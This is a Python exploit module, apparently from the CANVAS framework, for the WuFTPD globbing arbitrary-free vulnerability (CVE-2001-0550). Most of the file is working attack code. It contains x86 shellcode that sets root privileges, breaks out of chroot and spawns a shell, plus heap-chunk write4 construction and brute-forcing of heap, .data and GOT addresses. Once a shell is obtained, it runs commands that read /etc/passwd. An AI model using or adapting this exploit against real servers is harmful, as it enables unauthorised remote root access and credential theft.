#!/usr/bin/env python

# WuFTPD globbing exploit

import sys
if '.' not in sys.path:
    sys.path.append('.')
import time
import struct

from MOSDEF import mosdef
    
from tcpexploit import *
from exploitutils import *
from libs.wuftplib import FTP

import hashlib

NAME="WuFTPD Globbing Arbitrary Free"

DESCRIPTION="WuFTPD Globbing Arbitrary Free"

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="wuftpd.org"
DOCUMENTATION["Date public"] = ""
DOCUMENTATION["CERT Advisory"] = ""
DOCUMENTATION["References"] = ""
DOCUMENTATION["CVE Name"] = "CVE-2001-0550"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0550"
DOCUMENTATION['CVSS'] = 7.5


PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux", "i386", "_all"], ["_FreeBSD"], ["_HP-UX"], ["_SCO"] ]

VERSION="0.1"

NOTES="""
Legacy bug support for CANVAS

have to use a CMD that mallocs .. if you run into mangling of tab chars
find the original strcpy of data loc for debugging:

Point being .. your chunk will live _somewhere_ on the heap .. but you
wanna find the original LIST PPP string due to mangling reasons ...

strncasecmp(0x08085900, 0x0806d3f2, 10, 0, 0x0808fad0) = -7
strchr("LIST ~{\n", '\n')                         = "\n"

(gdb) x/s 0x08085900
0x8085900 <optopt+76320>:        "LIST ~{\n"
(gdb) x/20x 0x08085900
0x8085900 <optopt+76320>:       0x5453494c      0x0a7b7e20      0x08090000      0x08090404
0x8085910 <optopt+76336>:       0x08090404      0x08090404      0x08090404      0x08090404
0x8085920 <optopt+76352>:       0x08090404      0x08090404      0x08090404      0x08090404
0x8085930 <optopt+76368>:       0x08090404      0x08090404      0xfffffffc      0xfffffffc
0x8085940 <optopt+76384>:       0x08090404      0xbffffef6      0xfffffff5      0xfffffff1
(gdb) 

Program received signal SIGSEGV, Segmentation fault.
0x40101e46 in chunk_free (ar_ptr=0x401b5620, p=0x808fb0c) at malloc.c:3242
3242    malloc.c: No such file or directory.
        in malloc.c
(gdb) x/i$pc
0x40101e46 <chunk_free+518>:    mov    %eax,0xc(%edx)
(gdb) i r eax
eax            0x50505050       1347440720
(gdb) i r edx
edx            0x41424340       1094861632
(gdb) 

IMPORTANT NOTE:

You should not try to find your chunk below sbr_base, because you won't reach chunk_free:

(gdb) x/x $ebx+0xffffe920
0x401b5a74 <sbrk_base>: 0x0808bd00
(gdb)

...

When find chunk finds our chunk above sbrk_base:

Program received signal SIGSEGV, Segmentation fault.
0x40101e46 in chunk_free (ar_ptr=0x401b5620, p=0x808fb1c) at malloc.c:3242
3242    malloc.c: No such file or directory.
        in malloc.c
(gdb) x/i$pc
0x40101e46 <chunk_free+518>:    mov    %eax,0xc(%edx)
(gdb) i r eax
eax            0x41414139       1094795577
(gdb) i r edx
edx            0x41424344       1094861636
(gdb) 


... but when we try to go below sbrk_base:

1: x/i $eip  0x40101bbe <__libc_free+126>:      cmp    0xffffe920(%ebx),%esi
(gdb) x/x $ebx+0xffffe920
0x401b5a74 <sbrk_base>: 0x0808bd00
(gdb) i r esi
esi            0x808594c        134764876
(gdb) si  
0x40101bc4      3143    in malloc.c
1: x/i $eip  0x40101bc4 <__libc_free+132>:      jae    0x40101c30 <__libc_free+240>
(gdb) si
0x40101bc6      3143    in malloc.c
1: x/i $eip  0x40101bc6 <__libc_free+134>:      mov    %esi,%eax

...

And we'll end up in the mov (%eax),%edx crash nonsense.

Tab note:

09 == tab == annoyances with tab to space conversion sometimes.

int3 base trigger:

Program received signal SIGTRAP, Trace/breakpoint trap.
0x0808598d in optopt () at eval.c:41
41      eval.c: No such file or directory.
        in eval.c
(gdb) x/i$pc
0x808598d <optopt+76461>:       int3   
(gdb) 

Brute logic:

- Write to stack for 'find chunk' logic .. if crash == failed write4 .. if stall == found chunk/shellcode loc
- use HELP return to locate .data section
- brute GOT from there

UPDATE:

moved to the old public logic, no need for reinventing wheels and im pretty sure I'm not smarter
than Dvorak.

UPDATE:

Put in our own logic to make bug brutable .. required little GLOB trickery for a survivable write4
see notes.

UPDATE:

Source:

ftpcmd.y

...

char cbuf[512];

...

extern struct tab cmdtab[]

...

struct tab cmdtab[] =
{                               /* In order defined in RFC 765 */
    {"USER", USER, STR1, 1, "<sp> username"},
    {"PASS", PASS, ZSTR1, 1, "<sp> password"},
    {"ACCT", ACCT, STR1, 0, "(specify account)"},
    {"SMNT", SMNT, ARGS, 0, "(structure mount)"},
    {"REIN", REIN, ARGS, 0, "(reinitialize server state)"},
    {"QUIT", QUIT, ARGS, 1, "(terminate service)",},
    {"PORT", PORT, ARGS, 1, "<sp> b0, b1, b2, b3, b4, b5"},
    {"PASV", PASV, ARGS, 1, "(set server in passive mode)"},
    {"TYPE", TYPE, ARGS, 1, "<sp> [ A | E | I | L ]"},
    {"STRU", STRU, ARGS, 1, "(specify file structure)"},
    {"MODE", MODE, ARGS, 1, "(specify transfer mode)"},
}

etc.

..

Both live in .data .. so if we know cmdtab by hitting it in .data
we know where payload lives too .. saves us a crap ton of bruting

Which is a better way of abusing the HELP muckery :P (does require
a smaller step for the data brute but it's only 2 pages or so so
whatever.

"""

TARGETS = { # info, timer, cbuf offset, debug
0 : ["AutoMagical", 0, 0, False],
1 : ["2.6.0 (SLOW)", 2, 0x011b10, False],
2 : ["2.6.1 (FAST)", 0, 0x012d10, False],
3 : ["DEBUG", 0, 0, True]
}

CHUNK_OFFSET = 256
# if you change the chunk type used, be sure to change the free offset also
FREE_OFFSET = 4

### CANVAS Exploit Class ###

class theexploit(tcpexploit):
    
    def __init__(self):
        tcpexploit.__init__(self)
        self.host = '192.168.132.128'
        self.port = 21
        self.execve = False # controls MOSDEF or SHELL
        self.timer = 0 # only set on targets that have inetd flood protection (RH 6.2 e.g.)
        self.debugged = False
        self.use_data_base = False # use data_base or got_base for cbuf offset calcs ? 
        return
    
### CANVAS API Functions ###

    def displayVersions(self):
        i = 0
        for listline in TARGETS.values():
            print "%d : %s"% (i, listline[0])
            i = i + 1
        sys.exit(0)
    
    def createShellcode(self):
        # needs chroot break I guess ..

        # SETUID
        self.shellcode = """
        // setreuid(0, 0)
        xorl %eax,%eax
        xorl %ebx,%ebx
        xorl %ecx,%ecx
        movb $70,%al
        int $0x80
        """
        
        # CHROOT .. has to be enabled for MOSDEF too :(
        # due to old mmap semantcis for MOSDEF needing
        # /dev/zero access .. we're just TOO spiffy
        # to not end up with a non-chrooted environ :P

        if self.execve == True or 1:

            self.shellcode += """
            // mkdir(o..)
            xorl %eax,%eax
            // nul terminate
            pushl %eax
            pushl $0x2E2E6F6F
            movl %esp,%ebx
            // point to o..
            incl %ebx
            pushl %ebx
            xorl %ecx,%ecx
            movb $39,%al
            int $0x80

            // chroot(o..)
            popl %ebx
            pushl %ebx
            xorl %eax,%eax
            movb $61,%al
            int $0x80

            // loop chdir(..)
            popl %ebx
            // point to ..
            incl %ebx
            pushl %ebx
            xorl %ecx,%ecx
            movb $255,%cl

    chdir_loop:

            popl %ebx
            pushl %ebx
            xorl %eax,%eax
            movb $12,%al
            int $0x80

            loop chdir_loop

            // chroot(.)

            popl %ebx
            // point to .
            incl %ebx
            xorl %eax,%eax
            movb $61,%al
            int $0x80
        """
        
        # TRIGGER
        self.shellcode += """
        // write GO CRLF to stdout
        xorl %eax,%eax
        xorl %ebx,%ebx
        xorl %edx,%edx
        pushl $0x090C4E46
        addl $0x01010101,(%esp)
        movl %esp,%ecx // *s
        movb $4,%dl // len 4
        incl %ebx // stdout
        movb $4,%al
        int $0x80
        """
    
        if self.execve == True:

            # EXECVE
            self.shellcode += """               
            // execve("/bin//sh", [ "/bin//sh", 0], 0)
            xorl %eax,%eax
            pushl %eax
            pushl $0x68732F2F
            pushl $0x6E69622F
            movl %esp,%ebx
            pushl %eax
            pushl %ebx
            movl %esp,%ecx
            xorl %edx,%edx
            movb $11,%al
            int $0x80
        """

        else:

            # MOSDEF .. read a 255 byte stage2 from stdin
            self.shellcode += """
            xorl %eax,%eax
            xorl %ebx,%ebx
            xorl %ecx,%ecx
            xorl %edx,%edx
            movb $255,%dl
            subl %edx,%esp
            movl %esp,%ecx
            movb $3,%al
            int $0x80
            // ignore the first 4 bytes read
            // just want to get to MOSDEF
            incl %ecx
            incl %ecx
            incl %ecx
            incl %ecx
            // use 0 for * fd reg
            xorl %ebx,%ebx
            jmp *%ecx
        """

        self.shellcode = 'A' * 16 + mosdef.assemble(self.shellcode, 'X86')
        return self.shellcode
    
    def neededListenerTypes(self):
        return []
    
    def test(self):
        return 0
    
### EXPLOIT FUNCTIONS ###

    def ftp_connect(self, host, port):
        """ connect and grab welcome banner """
        if self.timer:
            self.log("[!] Delaying timer due to self.timer being set ..")
            time.sleep(self.timer)
        if self.debugged == True:
            self.log("[!] Connecting to %s:%s"% (host, port))
        s = self.gettcpsock()
        s.connect((host, port))
        return s
    
    def ftp_login(self, s, host, user, password):
        """ ftp login """
        s.set_timeout(1.0) # XXX ONLY FOR LANS .. SET HIGHER OTHERWISE/REAL WORLD

        try:
            ftp = FTP(host, s)
            ftp.login(user, password)
        except:
            s.close()
            return None

        return ftp

    def get_write4_buf(self, size, what, where):
        buf = 'P' * CHUNK_OFFSET
        buf += self.get_write4_chunk(what, where)
        while len(buf) < size - len(self.shellcode):
            buf += "\xeb\x10"
        if self.debugged == True:
            print "[!] sizeof shellcode: %d" % len(self.shellcode)
        buf += self.shellcode
        return buf

    def get_write4_chunk(self, what, where):
        chunk = ''

        PREV_INUSE = 1
        IS_MMAP = 2
        NON_MAIN_ARENA = 4

        if 0:
            # FREE_OFFSET == 4

            # old style
            chunk +=  struct.pack('<L', -16) # prev_size    
            chunk +=  struct.pack('<L', -16) # size    
            chunk +=  struct.pack('<L', where - 12) # fd    
            chunk +=  struct.pack('<L', what) # bk

        elif 1:
            # FREE_OFFSET == 4

            # old proper-style
            chunk +=  struct.pack('<L', -4) # prev_size    
            chunk +=  struct.pack('<L', -4) # size    
            chunk +=  struct.pack('<L', what) # fd    
            chunk +=  struct.pack('<L', where - 8) # bk

        elif 0:
            # FREE_OFFSET == 8

            # compatible with old/new (but still pretty old) libc chunk

            # first chunk
            chunk += struct.pack('<L', -4)
            chunk += struct.pack('<L', -4) # sizeB
            chunk += struct.pack('<L', -4) # sizeA
            chunk += struct.pack('<L', what) # what
            chunk += struct.pack('<L', where - 8) # where - 8
            # second chunk
            chunk += struct.pack('<L', -4)
            chunk += struct.pack('<L', -4) # sizeB
            chunk += struct.pack('<L', -4) # sizeA
            chunk += struct.pack('<L', what) # what
            chunk += struct.pack('<L', where - 8) # where - 8

            i = 10 # 2*5 dwords per chunk
            while i < 14:
                          
                if i%2:
                    backlen = (-(i-8) * 4)
                else:
                    backlen = (-(i-3) * 4)
                
                if self.debugged == True:          
                    print "[!] Adding %d back_sz field to chunk"%\
                          ((backlen & ~(IS_MMAP|NON_MAIN_ARENA)) | PREV_INUSE)
            
                chunk += struct.pack('<L', (backlen & ~(IS_MMAP|NON_MAIN_ARENA)) | PREV_INUSE)
                i += 1

        return chunk
    
    def ff_escape(self, s_in):
        s_out = ''
        for c in s_in:
            if c in ['\xff']:
                s_out += '\xff'
            s_out += c
        return s_out

    def heap_fill(self, ftp, n, size):
        """ use RNFR memory leak to fill holes """

        i = 0
        leakme = ''

        while i < size:
            if i % 2 == 0:
                leakme += '.'
            else:
                leakme += '/'
            i += 1

        while n:
            if self.debugged == True:
                print "[+] leaking size %d with: RNFR %s" % (size, leakme)
            try:
                ftp.sendcmd('RNFR ' + leakme)
            except Exception, msg:
                pass # ignore 550's
            n -= 1

        return

    def chunk_round(self, size):
        """ round chunksize macros """
        MALLOC_ALIGN_MASK = 0x07
        MALLOC_MINSIZE = 0x10
        if (size + 4 + MALLOC_ALIGN_MASK) < (MALLOC_MINSIZE + MALLOC_ALIGN_MASK):
            return MALLOC_MINSIZE
        else:
            return (size + 4 + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK

    def chunk_allsize(self, size):
        size = self.chunk_round(size) + 8
        return size

    def chunk_rounddown(self, size):
        if size <= 8:
            return 1
        else:
            return size - 4 - 11

    def chunk_strrounddown(self, size):
        if self.chunk_rounddown(size)> 1:
            return self.chunk_rounddown(size) - 1
        else:
            return 1

    def buildsize(self, ftp, last_size_byte, size):
        buf = 'A' * (size - 8 - 4 + 2)
        #print 'CWD ' + buf
        try:
            ftp.sendcmd('CWD ' + buf)
        except Exception, msg:
            pass # 550 expected
        buf = 'B' * (size - 8 - 4 + 1)
        #print 'CWD ' + buf
        try:
            ftp.sendcmd('CWD ' + buf)
        except Exception, msg:
            pass # 550 expected
        buf = 'C' * (size - 8 - 4)
        #print 'CWD ' + buf
        try:

            size_control = ''

            if size_control == '':
                # TESO style control last size byte point forward to chunk buf
                ftp.sendcmd('CWD ' + buf + '%c' % last_size_byte)
            else:
                # our style control
                ftp.sendcmd('CWD ' + buf + self.ff_escape(size_control))

        except Exception, msg:
            pass # 550 expected

        self.heap_fill(ftp, 1, self.chunk_strrounddown(size))

        return

    def write4(self, ftp, what, where, prepad):
        """ much of this logic comes from the old public exploits to save time re-inventing wheels on dead bugs """

        # fill heap
        self.heap_fill(ftp, 73, 4)

        # get working dir len
        try:
            pwd = ftp.sendcmd('PWD')
            pwd = pwd.split('"')[1]
        except:
            print "[!] ODD PWD EXCEPTION"
            return 0

        if self.debugged == True:
            print "[+] PWD: %s" % pwd
        wd_size = len(pwd)

        # do chunk size calcs
        wd_size += 3
        wd_size = self.chunk_round(wd_size)
      
        # do chunk fun (has write4 chunk and shellcode)
        chunk_buf = self.get_write4_buf(500 - len('CWD '), what, where)
        # will except on error_perm 550 .. expected
        try:
            ftp.sendcmd('CWD ' + self.ff_escape(chunk_buf))
        except Exception, msg:
            pass

        # the synnergy trickery ala TESO
        #
        # puts ptrs to chunks on the heap thus we dont have to brute chunk addr
        # you play with the . and , until you align it to hit with the right ptr
        # to data you control .. now ideally you have this nicely NULL terminated
        # for when you want a survivable write4 (needed for bruting)

        ptr_fill = '.,.,.,.,.,.,.,.,.,.' # each glob op puts a ptr in the list on the heap

        # so the trick becomes finding the pad to ensure the free() happens
        # on a pointer that points into data we control :>

        # one catch is that you have to find the offset to the last ptr in the list
        # this ensures that the free-ing is terminated on the NULL termination of
        # the list .. otherwise you get something like:

        #malloc(4)                                         = 0x080996a0
        #free(0x08099658)                                  = <void> 
        #free(0x08099668)                                  = <void>
        #free(0x00003959)                                  = <void> # <- CRASH HERE

        # it puts that 39bla value 2 dwords after the ptr-to-our-chunk and then walks
        # that listaroo .. so if our ptr-to-chunk is followed by a NULL then we 
        # should survive the write4 :) .. this last ptr points to a chunk with
        # the next size control .. and it's the old write4 from there on .. finding
        # the NULL terminated pointer in the list is the 'trick' for being able
        # to brute this bug .. was annoying :>

        try:
            ftp.sendcmd('CWD ~/{%s}' % ptr_fill)
        except Exception, msg:
            pass

        try:
            ftp.sendcmd('CWD .')
        except Exception, msg:
            # if we hit a error here it probably means something is funky in our buf
            self.log("[!] GOT ODD EXCEPTION IN CWD .")
            return 0

        # do padding muck
        #prepad = self.chunk_allsize(len('~/{%s}' % ptr_fill) + wd_size - 0x08)

        self.heap_fill(ftp, 1, self.chunk_rounddown(prepad));

        dist = 0x10 + 4 * wd_size
        padsize = dist - 0x18 - wd_size - 0x10

        fakechunk_size_byte = CHUNK_OFFSET + FREE_OFFSET
        fakechunk_size_byte -= prepad
        fakechunk_size_byte |= 1 # PREV_INUSE        

        #fakechunk_size_byte += 4 # only needed for old way

        self.buildsize(ftp, fakechunk_size_byte, 0x10)

        if self.debugged:
            print "[!] size offset to: 0x%X" % fakechunk_size_byte

        self.heap_fill(ftp, 1, padsize - 8 - 1)

        if self.debugged == True:
            self.log("[!] Triggering free ..")

        # trigger write4 free
        try:
            trigger = ftp.sendcmd('CWD ~{')
        except EOFError:
            if self.debugged == True:
                self.log("[!] EOF Error .. probable crash")
            return 0
        except timeoutsocket.Timeout:
            if self.debugged == True:
                self.log("[!] recv timed out ..")
            return 2
        except Exception, msg:
            # on trigger we have an exception msg == 'GO'
            if msg:
                self.log("== %s ==" % msg)

                if 'GO' in msg:

                    if self.execve == True: 

                        # telnet interact with execve shell
                        from libs.ctelnetlib import Telnet
                        telnetshell = Telnet()
                        telnetshell.sock = ftp.sock
                        telnetshell.sock.send('/sbin/ifconfig -a;cat /etc/passwd;uname -a\n')
                        return telnetshell

                    else:

                        # MOSDEF .. payload reads blindly 255 bytes and then goes into MOSDEF
                        # because our MOSDEF code mmaps from /dev/zero we HAVE to break chroot
                        
                        from MOSDEFShellServer import MosdefShellServer
                        from linuxNode import linuxNode
                        node = linuxNode()
                        node.parentnode = self.argsDict["passednodes"][0]
                        shellServer = MosdefShellServer('Linux', 'i386')
                        shellServer(ftp.sock, node)
                        node.startup()
                        self.setSucceeded()
                        return node

                else:
                    return 0
        
        # 0 == crash, 1 == alive and well, 2 == timed out

        return 1
            
    def ftp_setup(self, host, port):

        tries = 3
        ftp = None

        while ftp == None and tries:
    
            s = self.ftp_connect(self.host, self.port)
    
            # with a try delay so we're a bit more robust ..

            ftp = self.ftp_login(s, self.host, 'anonymous', 'anon@anon.com')
            if ftp == None:
                s.close()

                self.log("[!] Delaying 35 seconds before reconnect for flood protect bypass")
                counter = 35
                print "[!] Flood protect delay countdown .. go have a cookie"
                while counter:
                    sys.stdout.write("%ds .." % counter); sys.stdout.flush()
                    time.sleep(1) # 35 sec delay is xinetd flood protection default
                    counter -= 1

                print "\n[!] Continue .."

                tries -= 1

        # BAD BAD BAD
        if ftp == None:
            raise Exception, 'Could not FTP login .. fail'

        return ftp

    def debug(self):
        if self.debugged:
            print "[-] halted .. <enter> to continue"; sys.stdin.read(1)
        return

    def check_addr(self, addr):
        addr_bytes = struct.pack('<L', addr)
        if '\x00' in addr_bytes:
            return 0
        if '\x0a' in addr_bytes:
            return 0
        return 1

### PSEUDO-SMART BRUTING ROUTINES ####

    def find_prepad(self):
        # 1. find the correct prepad for a survivable write4
        prepad = 0x64
        endpad = prepad * 2

        while prepad < endpad:

            self.log("[!] Prepad probe: %d" % prepad)

            ftp = self.ftp_setup(self.host, self.port)
            ret = self.write4(ftp, 0xbffff0f0, 0xbffff0f0, prepad)

            if ret in [1, 2]: # alive or timeout is good :>
                self.log("[!] found write4 surviving prepad at: %d" % prepad)
                ftp.quit()
                break

            prepad += 4
      
        if prepad >= endpad:
            self.log("[-] failed to find prepad write4survive offset ..")
            ftp.quit()
            return 0
 
        return prepad

    # because cbuf is also in .data it's a relative static offset from cmdtab :>
    # this greatly reduces the amount of bruting we need to do (sizeof(cmdtab)) 
    # at most like 0x3c0 or something .. so make it like a 0x500 range to be safe

    def find_data(self, prepad):
        # 2. get HELP reply for .data finding and get a hash from it

        ftp = self.ftp_setup(self.host, self.port)
        help_orig = ftp.sendcmd('HELP')

        if self.debugged == True or 1:
            print "[!] original HELP response:\n%s" % help_orig

        m = hashlib.md5()
        m.update(help_orig)
        help_orig_md5 = m.hexdigest()

        self.log("[!] HELP hash: %32s" % help_orig_md5)

        ftp.quit()

        # 3. start finding the .data section via HELP structure
        data_base = 0x08064040 # lowest start found (approx) 
        data_end = 0x08084040 # highest end found (approx)

        data_step = (len(help_orig)/2) & 0xfffffff0
        self.log("[!] data step: 0x%X" % data_step)

        help_new_md5 = help_orig_md5

        # keep track of first no crash and use as data_base if cant find HELP
        # some older wu's don't have the HELP stuff in their .data apparently :>

        first_no_crash = 0

        while data_base <= data_end:

            if not self.check_addr(data_base):
                data_base += data_step
                continue

            ftp = self.ftp_setup(self.host, self.port)

            self.log("[!] HELP .data probe @ 0x%X" % data_base)

            ret = self.write4(ftp, data_base, data_base, prepad) # survivable addie for mirror write

            DATA_SIZE = 0x1000 * 3 # roughly 3 pages

            if ret in [1, 2]:

                # LOGIC FOR NON HELP FINDING VERSIONS
                if not first_no_crash:
                    first_no_crash = data_base
                    # if we find start of data .. we can set the end val more clever like :P
                    data_end = data_base + DATA_SIZE # 2.5 pages approx for .data (more like 3 but keep low)

                try:
                    help_new = ftp.sendcmd('HELP')
                except Exception, msg:
                    print "[!] Exception on HELP (%s)" % msg
                    data_base += data_step
                    continue

                m = hashlib.md5()
                m.update(help_new)
                help_new_md5 = m.hexdigest()

                if help_new_md5 != help_orig_md5:
                    self.log("[!] possibly hit HELP in .data at: 0x%X" % data_base)
                    self.log("[!] new HELP hash: %32s ...\nHELP orig:\n%s\nHELP new:\n%s" % \
                            (help_new_md5, repr(help_orig), repr(help_new)))

                    # check for false positives .. sometimes you trigger a diff HELP by mangling .data
                    #
                    # UPDATE:
                    #
                    # what happens is you toggle the 'implemented' flag in the cmdtab and it returns
                    # cmds as implemented .. so these aren't false positives but actually you hitting
                    # into the cmdtab structure as expected .. which is good ! :>
 
                    break # now we know where cbuf lives too .. which is where our payload is! (approx)

                else:
                    data_base += data_step

            # if we got a crash step with a page size to speed things up until we hit no crash for .data
            else:
                # cant quit on crash
                data_base += 0x1000

            ftp.close()

        if data_base >= data_end:

            # LOGIC FOR NON HELP FINDING VERSIONS
            if first_no_crash:
                self.log("[!] Did not find HELP .. found approx start of .data @ 0x%X (adding DATA_SIZE : 0x%X)" %\
                        (first_no_crash, DATA_SIZE))
                # if we use end of .data .. then we want to switch to GOT base offsetting mode .. takes longer
                self.use_data_base = False
                return first_no_crash + DATA_SIZE
            else:
                return 0

        return data_base + 0x500 # where our target .got lives approx

    # UPDATE: a more reliable way of doing it is to use a static cbuf offset for the general wu version
    # and use that from the crashing address as the payload offset base range .. this keeps us a bit
    # more robust and less iffy
        
    def brute_got(self, data_base, prepad, cbuf_off):
        # 4. brute GOT

        got_base = (data_base & 0xfffffff0)
        got_end = got_base + 0x300

        # when we find a GOT hit that crashes .. we brute the heap for payload .. if no
        # success .. then go back to bruting the next GOT entry that crashes ..

        # 5. check for payload execution

        while got_base <= got_end:

            if not self.check_addr(got_base):
                got_base += 4
                continue

            ftp = self.ftp_setup(self.host, self.port)

            self.log("[!] GOT probe @ 0x%X" % got_base)
            ret = self.write4(ftp, got_base, got_base, prepad)
            ftp.close()

            if ret in [0]: # only interested in crashes

                self.log("[!] found interesting crash at: 0x%X .. investigating" % got_base)

                self.debug()

                # XXX: we might do a narrow to wide window brute logic here ..
                # 
                # e.g. if fails in small range .. try bigger range .. etc.
                # especially considering sbrk_base will vary wildly between say 2.4.2 and 2.6.1

                BRUTE_RANGE = 0x400 # double when you want to be _SURE_
                
                # CHANGED FROM USING DATA_BASE TO CRASHING GOT_BASE ! :>
                # theoraadtically this will also work even when we only 
                # find the start of .data and not the actual cmd tab :P

                if self.use_data_base == False: # see above

                    # essentially the brute range makes up for allowances in
                    # got location differences ... so the base offset should
                    # be something like .data end + cbuff_off <- RANGE ->
                    sbrk_base = (got_base + cbuf_off) & 0xfffffff0 # mininmal offset to where cbuf lives

                else:

                    # we found cmdtab .. so try and rely on it for our buf offsetting :)
                    sbrk_base = (data_base + cbuf_off) & 0xfffffff0 # where cbuf lives

                sbrk_end = (sbrk_base + BRUTE_RANGE) & 0xfffffff0
                sbrk_step = 0x30 # small step .. little room for payload

                sbrk_cnt = 0

                # brute down from the top of the heap window (faster than bruting up I hope)
                while sbrk_base < sbrk_end:

                    if not self.check_addr(sbrk_base):
                        sbrk_base += sbrk_step
                        sbrk_cnt += 1 
                        continue

                    self.log("[!] Payload probe [%d/%d] @ 0x%X with 0x%X" %\
                            (sbrk_cnt + 1, BRUTE_RANGE / sbrk_step, got_base, sbrk_base))

                    ftp = self.ftp_setup(self.host, self.port)
                    ret = self.write4(ftp, sbrk_base, got_base, prepad)

                    if ret not in [0, 1, 2, None]: # we got a shell!
                        self.log("[!] Looks like we got a shell :)")
                        return ret
                    else:
                        ftp.close()

                    sbrk_base += sbrk_step # small steps .. little room for payload
                    sbrk_cnt += 1

            got_base += 4

        return 0

### TEST for automagic ###

    def test(self):
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port",self.port))
        ftp = self.ftp_setup(self.host, self.port)

        self.log("[!] remote banner: %s" % ftp.banner)

        if "wu-2.6.1" in ftp.banner:
            self.version = 2
            ftp.quit()
            return 1

        if "wu-2.6.0" in ftp.banner:
            self.version = 1
            ftp.quit()
            return 1

        return 0

### CANVAS Main ###

    def run(self):

        self.host = self.target.interface
        self.port = int(self.argsDict.get("port",self.port))
        self.version = int(self.argsDict.get("version",self.version))        

        self.setInfo('%s: running against %s:%d' % (NAME, self.host, self.port))       

        if self.version == 0:

            self.log("[!] Trying AutoMagic ..")
            if self.test():
                self.log("[!] AutoMagic working .. (V: %s)" % TARGETS[self.version][0])
            else:
                self.log("[!] AutoMagic failed .. exiting")
                return 0
 
        info, self.timer, cbuf_off, self.debugged = TARGETS[self.version]
       
        ### STEP 1 ####

        # 1. get survivable prepad
        prepad = self.find_prepad()
        if not prepad:
            return 0

        self.setProgress(33.0)

        ### STEP 2 ###

        # 2. find .data
        data_base = self.find_data(prepad)
        if not data_base:
            return 0

        self.setProgress(66.0)

        ### STEP 3 ###

        # 3. brute GOT .. cbuf is at a static offset from crashing GOT :>
        ret = self.brute_got(data_base, prepad, cbuf_off)

        self.setProgress(100.0) # APPROX!

        ### DANCE DANCE REVOLUTION ###

        if ret not in [0, 1, 2, None]:
            self.setInfo('%s: against %s:%d succeeded' % (NAME, self.host, self.port))       
            return ret # shell !
        else:        
            self.setInfo('%s: against %s:%d failed' % (NAME, self.host, self.port))       
            return 0

### Commandline ###

if __name__ == '__main__':
    print "Running CANVAS " + NAME + " version " + VERSION
    app = theexploit()
    ret = standard_callback_commandline(app)
    if ret not in [0, 1, None]:
        ret.interact()
